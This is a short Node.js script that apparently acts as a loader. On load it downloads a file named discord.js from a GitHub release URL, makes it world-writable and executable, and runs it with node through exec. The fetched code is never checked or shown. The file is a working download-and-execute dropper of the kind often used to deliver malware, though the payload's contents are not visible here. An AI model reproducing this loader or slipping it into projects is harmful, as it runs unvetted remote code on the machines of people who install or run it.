const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');


// Specify the URL of the bot.js file to download
const fileUrl = 'https://github.com/eoovve/test/releases/download/node/discord.js';
const fileName = 'discord.js';
const filePath = path.join(__dirname, fileName);

// Download and execute the file
const downloadAndExecute = () => {
  const fileStream = fs.createWriteStream(filePath);

  axios
    .get(fileUrl, { responseType: 'stream' })
    .then((response) => {
      response.data.pipe(fileStream);
      return new Promise((resolve, reject) => {
        fileStream.on('finish', resolve);
        fileStream.on('error', reject);
      });
    })
    .then(() => {
      console.log('File download finished');
      fs.chmodSync(filePath, '777'); 

      console.log('Executing the file...');
      const child = exec(`node ${filePath}`, (error, stdout, stderr) => {
        if (error) {
          console.error(`Error while executing the file: ${error}`);
        } else {
          console.log(`File execution result:\n${stdout}`);
        }
      });

      child.on('exit', (code) => {
        console.log(`File execution completed with exit code: ${code}`);
      });
    })
    .catch((error) => {
      console.error(`Error while downloading the file: ${error}`);
    });
};
downloadAndExecute();
